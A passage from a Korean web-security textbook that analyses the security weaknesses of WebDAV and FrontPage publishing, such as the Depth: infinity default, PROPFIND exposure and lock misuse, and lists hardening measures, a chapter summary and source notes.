**첫째, 읽기 전용 프로토콜에 쓰기 시맨틱을 얹었다.** HTTP의 경로 위에 있는 모든 것 — 방화벽, 프록시, 캐시, 로그 분석기, WAF — 은 `GET`과 `HEAD`가 안전하다는 전제 위에서 만들어졌고, `POST`가 상태를 바꾼다는 것 정도를 알고 있다. `PROPPATCH`, `MKCOL`, `MOVE`, `LOCK`이 무엇을 하는지 이 장비들은 대개 모른다. 결과가 여럿이다.

- **캐시는 무효화 신호를 받지 못한다.** 14.5절이 서술한 대로 캐시는 `PUT`·`POST`·`DELETE`를 보면 저장된 사본을 무효화한다. **`MOVE`로 사라진 리소스, `PROPPATCH`로 바뀐 속성, `MKCOL`로 생긴 컬렉션에 대해 캐시가 무엇을 해야 하는지는 정의되어 있지 않다.** 사라진 리소스의 옛 사본이 캐시에 남는다.
- **로그와 감사가 불완전해진다.** 접근 로그 형식(→ 16.2)은 메서드 필드를 갖지만 `PROPPATCH` 본문 안의 어떤 속성이 바뀌었는지는 기록하지 않는다. 15.10.3절이 서술한 "로그가 주체를 신뢰받는 계층으로만 기록한다"는 문제의 다른 형태다.
- **경계 정책이 표현력을 잃는다.** "쓰기를 막는다"는 규칙을 메서드 목록으로 표현해야 하는데, 그 목록은 WebDAV 확장과 벤더 확장을 따라 계속 자란다.

**둘째, 기본값이 위험한 쪽으로 열려 있다.** `Depth`의 기본값은 `infinity`다. `Depth` 헤더 없는 `DELETE` 하나가 컬렉션 전체와 모든 하위 컬렉션을 지운다. `COPY`와 `MOVE`도 같다. **이 책이 반복하는 원칙 — 안전한 기본값(secure by default) — 의 정반대다.** 협업 저작이라는 용도에서 "디렉터리를 통째로 옮긴다"가 흔한 동작이므로 그런 기본값이 선택된 것이지만, 그 선택의 대가는 실수 하나와 취약점 하나의 폭발 반경이 같다는 것이다.

**셋째, `PROPFIND`는 설계된 정보 노출이다.** 원서의 문장 그대로 **"한 번의 호출로 컬렉션의 전체 계층을 개별 개체의 모든 속성과 함께 조회할 수 있다."** 저작자에게 이것은 필수 기능이다. 인증 없이 노출된 서버에서 이것은 **완전한 사이트 지도**다. 12.4.2절의 디렉터리 리스팅이 한 디렉터리를 노출한다면 `PROPFIND`는 트리 전체를 한 번에 노출하며, 속성에는 크기·수정 시각·숨김 여부·컬렉션 여부가 포함된다(예제 15-18의 `ishidden`, `iscollection`). 25장의 애플리케이션 매핑과 30장의 정보 노출이 다루는 표면이 여기서 하나의 요청으로 압축된다.

**넷째, 잠금은 접근 통제가 아니다.** `opaquelocktoken`은 **협조적 편집의 조정 장치**이지 권한 검사가 아니다. 명세가 Digest 인증을 요구하는 것이 정확히 이 때문이다. 잠금이 의미를 가지려면 그 위에 "누구인가"를 판정하는 층이 있어야 한다. **인증 없이 활성화된 DAV에서 잠금은 아무것도 지키지 못한다.** 오히려 반대 방향의 문제가 생긴다.

- **`423 Locked`를 이용한 서비스 거부.** 익명으로 `LOCK`을 걸 수 있으면 리소스를 배타적으로 잠가 정당한 저작자를 막을 수 있다. 표 15-16의 `201 Created` 행 — **존재하지 않는 리소스에 대한 잠금이 그 리소스를 생성함으로써 성공한다** — 을 겹치면, 존재하지 않는 경로를 잠그는 것만으로 리소스를 만들어 낼 수 있다.
- **타임아웃이 구속력이 없다.** 명세가 명시하듯 "잠금 타임아웃은 지침일 뿐이고 서버를 반드시 구속하지 않는다." 잠금이 언제 풀리는지는 서버 구현과 관리자에게 달려 있다.

**다섯째, XML 본문이 새 파서를 요청 경로에 들여왔다.** WebDAV의 거의 모든 메서드가 XML 본문을 갖는다. 이것은 서버가 **HTTP 파서 외에 XML 파서를 요청 처리 경로에 두어야** 한다는 뜻이고, 그 파서는 네임스페이스, 엔티티, 스키마를 다뤄야 한다. 5.6절과 13.12절이 세어 온 "경로 위 파서의 수"에 하나가 더해지며, 그 파서가 다루는 문법은 HTTP보다 훨씬 표현력이 크다. XML 파서를 노출한 결과가 무엇인지는 28장이 다룬다.

**여섯째, 저작 채널과 열람 채널이 같은 곳에 있다.** FPSE와 WebDAV 모두 같은 호스트, 같은 포트, 같은 URL 공간에서 저작과 열람을 처리한다. `GET /ch-publish.fm`과 `PROPPATCH /ch-publish.fm`은 같은 리소스에 대한 요청이고, 둘을 가르는 것은 메서드 하나다. **이것이 편의의 원천이자 위험의 원천이다.** 15.9.3절이 서술한 "고객이 자기 웹 루트에 파일을 쓸 수 있는 업로드 설비"가 정확히 이 형태이며, 그 설비가 부실하면 공유 환경 전체가 무너진다.

### 15.11.4 발행 시스템의 강화

**1. 저작 채널을 열람 채널에서 분리한다.** 별도 호스트명, 별도 포트, 별도 인증, 가능하면 별도 네트워크 세그먼트에 둔다. 15.10.5절의 "컴포넌트 분리"를 발행 경로에 적용한 것이다. 15.9.6절이 "고객 접근 메커니즘은 견고한 인증을 구현하고 도청에 취약하지 않은 암호 기술을 쓰며 완전히 강화되어야 한다"고 말한 것과 같은 요구다.

**2. 인증 없는 DAV를 두지 않는다.** 명세가 Digest 인증을 요구하는 것은 형식이 아니다. 잠금·속성·컬렉션 조작 전체가 "누가"를 전제로 설계됐다. 그 전제가 없으면 프로토콜의 안전 장치가 전부 무의미해진다.

**3. `Depth`를 명시적으로 요구한다.** 서버 정책으로 `Depth` 헤더 없는 `DELETE`·`COPY`·`MOVE`를 거부하면 기본값 `infinity`가 만드는 폭발 반경이 사라진다.

**4. 메서드 집합을 최소화한다.** `OPTIONS`가 광고하는 것과 실제 허용되는 것을 일치시키고, 필요 없는 메서드는 디렉터리 단위로 닫는다. 12.7절의 점검 절차 — `OPTIONS`의 목록을 믿지 말고 각 메서드를 손으로 시도한다 — 가 그것을 검증하는 방법이다.

**5. 쓰기 가능 경로와 실행 매핑을 겹치지 않게 한다.** 12.4.3절과 12.7절이 서술한 대로, 쓰기(3단계)와 실행 매핑(4단계)이 만나는 지점이 백도어가 생기는 자리다. 저작자가 쓸 수 있는 경로가 서버 측 스크립트로 실행되는 경로와 겹치지 않아야 한다.

**6. 발행 경로를 감사한다.** 마스터 원 서버에 쓸 수 있는 자는 전 사이트에 쓸 수 있다(15.3.4절). 그 경로에서 일어나는 모든 동작 — 메서드, 대상 경로, 주체, 잠금 획득과 해제 — 을 기록하고, 그 기록이 사후에 "누가 무엇을 바꿨는가"를 재구성할 수 있는지 확인한다(→ 16.5).

## 이 장의 요약

- **호스팅의 형태를 고르는 일은 신뢰 경계를 고르는 일이다.** 전용 호스팅에서 ASP까지 내려가면서 공유되는 것이 늘고 격리를 담당하는 층이 하드웨어에서 소프트웨어로, 다시 애플리케이션 로직으로 내려간다. 격리를 담당하는 층은 격리되는 대상보다 아래에 있어야 한다.

- **이름 기반 가상 호스팅은 목적지를 정하는 권한을 클라이언트가 보낸 문자열에 넘겼다.** IP 기반 방식에서 사이트 결정의 입력은 위조에 비용이 드는 목적지 주소였고, `Host` 기반 방식에서 그것은 요청 메시지 안의 텍스트다. 이 하나의 사실에서 라우팅 오분류, 서버 생성 URL의 통제, 캐시 키의 흔들림, 절대 URI와의 불일치, SNI와의 이중화가 모두 따라 나온다.

- **명세는 목적지가 두 곳(절대 URI와 `Host`)에 실릴 수 있음을 인정하고 우선순위를 정해 두었다.** 우선순위가 있다는 것은 둘이 다를 수 있다는 뜻이고, 경로 위의 홉마다 다른 규칙을 적용할 수 있다는 뜻이다.

- **리다이렉션 기법은 "클라이언트가 자기 요청이 어디로 가는지 아는가"로 나뉜다.** HTTP `3xx`는 클라이언트가 알고, DNS와 anycast는 결과만 알며, MAC/IP 포워딩과 WCCP는 전혀 모른다. 인터셉션은 부분 URI 문제와 공유 캐시 문제를 클라이언트 동의 없이 성립시키는 기법이다.

- **PAC와 WPAD는 목적지 결정권을 가장 멀리 밀어낸다.** WPAD가 찾아내는 것은 주소가 아니라 브라우저가 실행할 코드의 URL이고, 그 URL을 정하는 것은 로컬 네트워크의 DHCP·DNS 응답이며, 어느 단계에도 "이 응답이 우리 조직의 것인가"를 판정하는 절차가 없다.

- **제어 평면은 데이터 평면보다 위에 있는 신뢰 경계다.** NECP와 WCCP의 메시지를 만들 수 있는 위치는 트래픽의 방향 자체를 결정한다. WCCP2의 보안 옵션에 `NO_SECURITY`가 존재하고 인증이 8옥텟 비밀번호의 MD5라는 사실은, 이 경계가 데이터 평면의 경계보다 약하게 지켜지는 관행을 그대로 보여 준다.

- **네트워크 계층에서 잃어버린 클라이언트 식별자를 애플리케이션 계층의 문자열로 복구하려는 시도는 위조 비용을 낮춘다.** full NAT이 IP를 지우고 `X-Forwarded-For`가 그것을 대신할 때, 로그·요율 제한·접근 통제의 근거는 클라이언트가 쓸 수 있는 값이 된다.

- **공유 환경에서 모든 테넌트의 코드가 같은 OS 사용자로 실행되면 파일 시스템 권한은 아무것도 격리하지 못한다.** `DocumentRoot` 분리는 정상 요청 흐름에만 유효한 논리적 구획이고, 코드가 파일 시스템을 직접 읽는 순간 사라진다. PHP safe mode가 남긴 교훈은 그 격리를 애플리케이션 계층에 두는 것이 구조적으로 잘못된 자리라는 것이다.

- **계층 분할은 관심사를 나누지만 권한을 나누지 않는다.** 데이터베이스가 애플리케이션의 접근 통제를 신뢰하고, 운영체제가 애플리케이션의 절제를 신뢰하는 상태에서, SQL 인젝션 하나가 전체 데이터를, 명령 인젝션 하나가 전체 호스트를 얻는다. 계층 분리의 목표는 공격을 막는 것이 아니라 **국지화**하는 것이다.

- **발행은 쓰기 경로이며 열람 경로와 다른 신뢰 요구를 갖는다.** FPSE는 인가의 단위(메서드와 경로)와 동작의 단위(본문 안의 명령)를 어긋나게 두었고, WebDAV는 그것을 의식적으로 피하는 대신 위험한 기본값(`Depth: infinity`)과 설계된 정보 노출(`PROPFIND`)과 새로운 파서(XML)를 들여왔다.

## 이어지는 장

이 장은 12~14장이 전제로 삼았던 것 — 메시지가 여기 도착했다 — 을 열어 보였다. 그 결과 두 개의 문장이 남는다. **목적지를 정하는 근거의 위조 비용이 그 구조의 강도이고, 격리를 담당하는 층은 격리되는 대상보다 아래에 있어야 한다.**

**16장은 이 장이 반복해서 미뤄 둔 질문을 받는다.** 15.6.5절이 full NAT에서 클라이언트 IP가 소실된다고 했고, 15.8.4절이 GRE 캡슐화 덕분에 그것이 보존되어 캐시에 쌓인다고 했으며, 15.10.3절이 신뢰하는 계층의 감사 로그는 사건의 주체를 "신뢰받는 계층"으로만 기록한다고 했다. 세 문장 모두 **무엇을 기록할 것인가, 그 기록으로 무엇을 재구성할 수 있는가, 그리고 그 기록 자체가 무엇을 누출하는가**로 이어진다. 16.1~16.5절이 그것을 정면으로 다루고, 16.6절은 15.9.4절이 서술한 공유 로그를 통한 권한 상승을 로그 인젝션이라는 이름으로 받는다. 그리고 15.11절이 서술한 고정 진입점 경로 — `_vti_inf.html`, `_vti_bin/` — 를 실제로 찾아다니는 주체가 16.8~16.11절의 로봇이다.

**Part IV가 이 장의 15.2절이 남긴 실을 이어받는다.** 이름이 HTTP 헤더 안에 있어서 TLS 핸드셰이크 시점에는 읽을 수 없다는 문제, 그래서 같은 이름이 핸드셰이크와 헤더 두 곳에 실리게 된 구조를 18.6절이 SNI라는 이름으로 다룬다. 17장이 인증서가 이름과 신원을 어떻게 결합하는지를 먼저 서술하고, 18.3~18.4절이 클라이언트가 실제로 무엇을 검증하는지를 다룬 뒤에야 그 문제가 제대로 보인다. **하나의 IP에 여러 이름이 얹힌다는 이 장의 전제가, 암호화된 통로에서는 인증서 선택의 문제로 다시 나타난다.**

**Part VI가 이 장의 15.9절과 15.10절을 공격자의 방법론으로 다시 쓴다.** 31.1절이 계층 아키텍처를, 31.2절이 공유 호스팅과 공유 애플리케이션 서비스를 다룬다. 이 장이 "무엇을 어디에 얹었기에 이런 문제가 생기는가"를 서술했다면, 그곳은 "애플리케이션을 마주한 테스터가 무엇을 어떤 순서로 시도하는가"를 서술한다. 그 사이에 27장(데이터 저장소 인젝션)과 28장(백엔드 컴포넌트 공격)이 이 장이 반복해서 인용한 결함 — SQL 인젝션, 명령 인젝션, 경로 순회, 파일 인클루전 — 을 각각 온전히 다룬다.

**마지막으로 Part IX가 이 장의 방어 절들을 설계의 언어로 옮긴다.** 46.3절의 프로세스 분리는 15.9절이 요구한 격리와 방향이 같되 전제가 다르고, 46.12절의 설정 검증은 15.3.4절이 지적한 복제 인스턴스의 설정 일관성 문제를 자동 테스트로 받는다. 그리고 **47.10절이 이 장의 가장 무거운 문장을 이어받는다.** 계층 사이의 신뢰가 깨지는 방식을 서술한 15.10절의 표 15-13은, 계층이 서로 다른 프로세스와 서로 다른 호스트로 흩어졌을 때 그대로 재현된다. 그때 계층 사이의 호출은 함수 호출이 아니라 네트워크 요청이며, **Part I~IV가 다룬 모든 문제 — 파싱 불일치, 목적지 결정, 이름과 신원, 중간자 — 가 조직 내부망에서 다시 나타난다.**

> 표 15-2·15-5·15-6·15-8·15-9·15-10·15-14·15-15·15-16·15-17은 HTTP-DG 표 18장의 기법 목록, 표 20-1, 표 20-2, 표 20-3, 표 20-4, 표 20-5, 19장의 메서드 목록, 19장의 헤더 목록, 표 19-1, 표 19-2 기준. 표 15-3은 HTTP-DG 18장의 `Host` 헤더 요구사항 목록을 표로 옮긴 것이다. 그림 15-1·15-2·15-3·15-4·15-6은 HTTP-DG 그림 18-6·20-7·20-9·20-12·19-3 기준, 그림 15-5는 WAHH 17장의 자바 계층 목록 기준. 예제 15-1·15-2·15-3·15-4·15-5·15-6·15-11~15-23은 HTTP-DG 그림 18-3·18-5·20-1·예제 20-1·그림 20-10·20장의 발견 순서·19장의 각 예제 기준. 예제 15-7·15-8·15-9·15-10과 표 15-11은 WAHH 17장 기준. 프로토콜 예시의 호스트명(`www.joes-hardware.com`, `www.marys-antiques.com`, `www.cnn.com`, `minstar`, `wahh-app1.com`)과 IP 주소·날짜·수치는 원서의 실행 예제를 그대로 따랐다.
>
> 표 15-1·15-4·15-7·15-12·15-13은 원서에 대응이 없는 이 책의 구성이다. 표 15-1은 HTTP-DG 18장의 호스팅 형태 분류에 WAHH 17장의 공유 환경·ASP 서술을 이어 붙이고 "격리의 단위"라는 열을 더한 것이다. 표 15-4는 이 장의 인프라 리다이렉션과 35.3절의 애플리케이션 리다이렉션을 구별하기 위한 것으로, 두 원서가 각각 다른 자리에서 다루는 것을 대조한 것이다. 표 15-7은 HTTP-DG 표 20-1·20-2의 기법들을 "클라이언트가 아는가"와 "클라이언트 IP가 보존되는가"라는 두 축으로 재배열한 것이며, 두 축의 개별 사실(예: full NAT의 클라이언트 IP 소실, WCCP GRE 캡슐화의 IP 보존)은 모두 원서에 명시되어 있다. 표 15-12는 WAHH 17장이 "Securing Shared Environments"에서 나열한 조치들을 격리의 층위별로 재정렬하고 각 층이 못 막는 것을 명시한 것이다. 표 15-13은 WAHH 17장의 "Exploiting Trust Relationships Between Tiers"와 "Subverting Other Tiers"가 서술한 개별 사례들을 신뢰의 내용별로 정렬한 것이다.
>
> 15.2.4절의 "목적지를 정하는 근거가 클라이언트가 보낸 값이다"라는 정식화, 15.5.1절의 신뢰 관점 분류, 15.6.5절과 15.8.4절의 "제어 평면은 데이터 평면보다 위에 있는 신뢰 경계다"라는 명제, 15.7.4절의 WPAD 신뢰 문제 네 가지, 15.9.5절의 격리 층위 정식화, 15.10.6절의 "계층 분할은 관심사를 나누지만 권한을 나누지 않는다", 15.11.3절의 발행 시스템 여섯 가지 성질은 이 책의 구성이다. 다만 그 재료는 모두 원서에 있다. `Host` 헤더 명세가 클라이언트에게 다섯 항목을 요구한다는 사실과 해석 규칙이 두 출처의 우선순위를 정한다는 사실(HTTP-DG 18장), 원서가 명시적으로 기록한 WPAD 스푸핑 사고와 그 원인 분석(20장), WCCP2 보안 옵션에 `WCCP2_NO_SECURITY`가 존재하고 MD5 옵션의 비밀번호가 8옥텟을 넘을 수 없다는 사실(표 20-5), full NAT에서 클라이언트 IP가 소실된다는 한계와 WCCP GRE 캡슐화가 그것을 보존한다는 대조(표 20-1·20-2와 20장 본문), PHP safe mode가 "구조적으로 잘못된 자리"라는 WAHH의 평가와 그 이유("운영체제가 애플리케이션 계층에게 자기 행동을 통제하라고 신뢰하는 일"), 감사 로그가 주체를 신뢰받는 계층으로만 기록한다는 WAHH의 지적, `MKCOL`을 별도 메서드로 정의한 두 번째 이유("대부분의 접근 통제 메커니즘은 메서드의 종류에 기반한다"), `Depth` 헤더의 기본값이 infinity라는 명세의 규정, `PROPFIND` 한 번으로 전체 계층을 조회할 수 있다는 HTTP-DG의 서술, `LOCK`이 존재하지 않는 리소스를 생성할 수 있다는 표 19-1의 `201 Created` 항목 — 이 사실들이 각 정식화의 근거다.
>
> 15.9절과 15.10절이 서술하는 내용은 31.1절·31.2절과 같은 원서(WAHH 17장)를 근거로 하며, 두 곳의 역할 분담은 15.9절 도입부의 상자에 명시했다. 15.11절의 WebDAV 서술은 12.7절과 같은 프로토콜을 다루되 근거 원서가 다르다. 12.7절은 WAHH 18장의 공격 절차를, 이 절은 HTTP-DG 19장의 프로토콜 전체를 근거로 한다.
